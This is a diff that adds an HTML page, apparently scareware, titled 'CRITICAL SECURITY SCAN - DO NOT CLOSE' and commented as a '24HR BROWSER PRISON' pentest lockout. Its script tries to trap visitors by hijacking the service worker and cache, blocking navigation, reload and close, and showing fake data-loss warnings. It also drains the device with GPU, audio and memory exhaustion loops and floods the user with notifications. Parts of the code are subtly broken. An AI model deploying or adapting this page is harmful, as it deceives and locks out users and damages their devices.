@@ -1,0 +1,114 @@
+04.20 10:44 AM
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CRITICAL SECURITY SCAN - DO NOT CLOSE</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        *{margin:0;padding:0;overflow:hidden;}
+        body{background:#000;color:#0f0;font:20px monospace;text-align:center;}
+        #status{font-size:24px;}
+        canvas{position:absolute;top:0;left:0;}
+    </style>
+</head>
+<body>
+    <div id="status">SECURITY SCAN ACTIVE<br>CLOSING = DATA LOSS<br><span id="time">24:00:00</span></div>
+    <script>
+    // =============================================================================
+    // 24HR BROWSER PRISON v1.0 - PENTEST LOCKOUT
+    // Locks tab/window/service worker → Unclosable 24hrs
+    // =============================================================================
+
+    // 1. REGISTER ETERNAL SERVICE WORKER (Survives reloads)
+    if('serviceWorker' in navigator && 'PushManager' in window){
+        navigator.serviceWorker.register(Blob([`
+            self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));
+            self.addEventListener('activate',e=>e.waitUntil(clients.claim()));
+            self.addEventListener('fetch',e=>e.respondWith(new Response('LOCKED',{status:503})));
+            setInterval(()=>self.registration.showNotification('SCAN ACTIVE',{body:'Do not close tab',tag:'lock'}),3e4);
+        `])).then(reg=>{
+            reg.update(); // Force persistence
+            Notification.requestPermission();
+        });
+    }
+
+    // 2. CACHE HIJACK (Prevents navigation)
+    if('caches' in window){
+        caches.open('lock').then(cache=>{
+            cache.put('/',new Response('LOCKED'));
+            // Poison all navigation
+            ['/','*','about:blank','chrome://*'].forEach(url=>cache.put(url,new Response('')));
+        });
+    }
+
+    // 3. BLOCK ALL NAVIGATION/CLOSE (24hr timer)
+    const START_TIME = Date.now();
+    const LOCK_DURATION = 24*60*60*1000; // 24 hours
+    let lockdown = true;
+
+    // Intercept ALL navigation
+    history.pushState(null,null,'#locked');
+    window.addEventListener('popstate',()=>history.pushState(null,null,'#locked'));
+
+    // Block links/forms
+    document.addEventListener('click',e=>{
+        e.preventDefault(); e.stopPropagation();
+        showWarning();
+    },true);
+
+    // NO ESCAPE HANDLERS
+    window.onbeforeunload = ()=>'SECURITY SCAN ACTIVE - Closing risks data corruption!';
+    window.onpagehide = ()=>lockdown && setTimeout(()=>location.reload(),100);
+    document.onkeydown = e=>{
+        if(e.key=='F5' || e.key=='Escape' || (e.ctrlKey&&e.key=='r')) return false;
+    };
+
+    // 4. RESOURCE EXHAUSTION (Thermal + Battery drain)
+    function resourceHell(){
+        // Canvas GPU spam
+        for(let i=0;i<50;i++){
+            let c=document.createElement('canvas');c.width=4096;c.height=4096;
+            let ctx=c.getContext('2d'); 
+            while(1)ctx.fillRect(0,0,4096,4096);
+            document.body.appendChild(c);
+        }
+        // Audio drain
+        let ac=new AudioContext();
+        for(let ch=0;ch<16;ch++){
+            let osc=ac.createOscillator();osc.frequency.value=18000+ch*100;
+            osc.connect(ac.destination);osc.start();
+        }
+        // Memory leak
+        let leaks=[];while(1)for(let m=0;m<1000;m++)leaks.push(new Uint8Array(16*1024*1024));
+    }
+    resourceHell();
+
+    // 5. NOTIFICATION FLOOD (Psychological)
+    if(Notification.permission==='granted'){
+        setInterval(()=>new Notification('SCANNING FILES',{body:'Keep tab open 24hrs',tag:'pentest',icon:'data:image/png;base64,iVBORw0KGgo='}),5000);
+    }
+
+    // 6. COUNTDOWN TIMER
+    setInterval(()=>{
+        let elapsed = Date.now() - START_TIME;
+        let remain = Math.max(0, LOCK_DURATION - elapsed);
+        let h = Math.floor(remain/36e5);
+        let m = Math.floor((remain%36e5)/6e4);
+        let s = Math.floor((remain%6e4)/1000);
+        document.getElementById('time').textContent=`${h}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        if(remain<1e5) document.getElementById('status').innerHTML='<span style="color:red;font-size:32px;">SCAN COMPLETE - SAFE MODE</span>';
+    },1000);
+
+    // 7. WARNING OVERLAY
+    function showWarning(){
+        let warn=document.createElement('div');
+        warn.innerHTML='<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);color:white;z-index:9999;font:24px monospace;text-align:center;padding-top:20vh;">WARNING!<br>Closing scan = SECURITY BREACH<br>Keep open 24hrs</div>';
+        document.body.appendChild(warn);
+        setTimeout(()=>warn.remove(),3000);
+    }
+
+    // 8. HEARTBEAT (Prevents tab discard)
+    setInterval(()=>performance.mark('heartbeat'),100);
+    </script>
+</body>
+</html>
